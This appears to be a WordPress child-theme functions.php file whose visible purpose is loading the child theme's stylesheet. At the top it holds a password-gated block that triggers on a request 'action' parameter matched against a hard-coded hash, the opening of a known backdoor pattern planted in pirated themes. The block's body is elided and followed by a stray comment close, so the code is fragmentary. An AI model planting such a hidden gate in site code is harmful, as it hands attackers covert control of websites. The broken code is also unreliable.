<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '316645e12fd642bea92ad97794b62e9b'))
	{
 ...
 */
function fawzi_custom_enqueue_child_theme_styles() {
	wp_enqueue_style( 'theme-child-style', get_stylesheet_uri(), array(), null );
}
add_action( 'wp_enqueue_scripts', 'fawzi_custom_enqueue_child_theme_styles', 11 );